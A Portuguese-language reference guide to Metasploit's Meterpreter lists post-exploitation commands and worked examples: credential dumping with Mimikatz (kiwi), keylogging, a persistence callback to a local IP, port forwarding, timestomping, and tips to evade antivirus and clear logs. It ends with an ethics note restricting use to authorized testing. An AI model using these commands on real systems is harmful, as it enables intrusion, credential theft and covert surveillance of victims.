# Meterpreter - Guia de Comandos Detalhados

## O que é Meterpreter?
Meterpreter (Meta-Interpreter) é um payload avançado e dinâmico do Metasploit que fornece um shell interativo com amplas capacidades de pós-exploração.

## Comandos Principais por Categoria

### 1. COMANDOS BÁSICOS DO SISTEMA

```bash
# Navegação e informações do sistema
pwd                    # Mostra diretório atual
getwd                  # Mostra diretório de trabalho
cd [diretório]         # Muda diretório
ls                     # Lista arquivos
cat [arquivo]          # Exibe conteúdo do arquivo

# Informações do sistema
sysinfo                # Informações do sistema operacional
getuid                 # Mostra usuário atual
getpid                 # Mostra ID do processo
ps                     # Lista processos em execução
```

### 2. COMANDOS DE ARQUIVOS

```bash
# Manipulação de arquivos
download [arquivo]     # Baixa arquivo da máquina alvo
upload [arquivo]       # Envia arquivo para a máquina alvo
edit [arquivo]         # Edita arquivo com editor padrão
rm [arquivo]           # Remove arquivo
mkdir [diretório]      # Cria diretório
rmdir [diretório]      # Remove diretório
search -f [padrão]     # Busca arquivos por padrão
```

### 3. COMANDOS DE REDE

```bash
# Informações de rede
ipconfig/ifconfig      # Mostra configurações de rede
netstat                # Exibe conexões de rede
route                  # Mostra tabela de roteamento
arp                    # Exibe tabela ARP

# Port forwarding
portfwd add -l [porta_local] -p [porta_remota] -r [ip_alvo]
portfwd list           # Lista encaminhamentos ativos
portfwd delete         # Remove encaminhamento
```

### 4. COMANDOS DE PRIVILÉGIOS

```bash
# Escalação de privilégios
getsystem              # Tenta elevar privilégios para SYSTEM
getprivs               # Mostra privilégios disponíveis
run post/windows/gather/smart_hashdump  # Extrai hashes SAM
```

### 5. COMANDOS DE KEYLOGGING

```bash
# Captura de teclas
keyscan_start          # Inicia keylogger
keyscan_dump           # Mostra teclas capturadas
keyscan_stop           # Para keylogger
```

### 6. COMANDOS DE MIGRAÇÃO DE PROCESSO

```bash
# Migração entre processos
migrate [PID]          # Migra para outro processo
run post/windows/manage/migrate  # Migração automática
```

### 7. COMANDOS DE PERSISTÊNCIA

```bash
# Persistência no sistema
run persistence -h     # Mostra opções de persistência
run metsvc             # Instala serviço Meterpreter
run getgui -e          # Habilita RDP
```

### 8. COMANDOS DE RECONHECIMENTO

```bash
# Coleta de informações
run post/windows/gather/checkvm           # Verifica se é VM
run post/multi/gather/env                 # Coleta variáveis de ambiente
run post/windows/gather/enum_applications # Lista aplicações instaladas
```

### 9. COMANDOS DE SHELL

```bash
# Interação com sistema
shell                  # Abre shell do sistema
execute -f [arquivo]   # Executa arquivo
execute -f cmd -i      # Executa cmd interativamente
```

### 10. COMANDOS AVANÇADOS

```bash
# Módulos avançados
load [extensão]        # Carrega extensões (python, powershell, etc.)
load kiwi              # Carrega Mimikatz
creds_all              # Mostra todas as credenciais (após carregar kiwi)

# Timestomp
timestomp [arquivo] -h # Manipula timestamps de arquivos
```

### 11. COMANDOS DE SAÍDA

```bash
# Gerenciamento da sessão
background             # Coloca sessão em segundo plano
sessions -i [ID]       # Retorna para sessão específica
exit                   # Encerra sessão Meterpreter
```

## Exemplos Práticos Comuns

### 1. Coleta de Hashes
```bash
getsystem
load kiwi
creds_all
hashdump
```

### 2. Persistência Básica
```bash
run persistence -U -i 60 -p 443 -r 192.168.1.100
```

### 3. Port Forwarding
```bash
portfwd add -l 3389 -p 3389 -r 192.168.1.50
```

### 4. Keylogging
```bash
keyscan_start
# Aguarde usuário digitar...
keyscan_dump
keyscan_stop
```

## Dicas Importantes

1. **Sempre migre** para um processo estável após acesso
2. **Use encoding** para evitar detecção por antivírus
3. **Limpe logs** após atividades
4. **Use HTTPS** para comunicações
5. **Monitore recursos** do sistema alvo

## Considerações Éticas

- Use apenas em sistemas que você possui ou tem autorização para testar
- Respeite os termos de serviço
- Obtenha autorização por escrito antes de realizar testes
- Use em ambientes controlados para aprendizado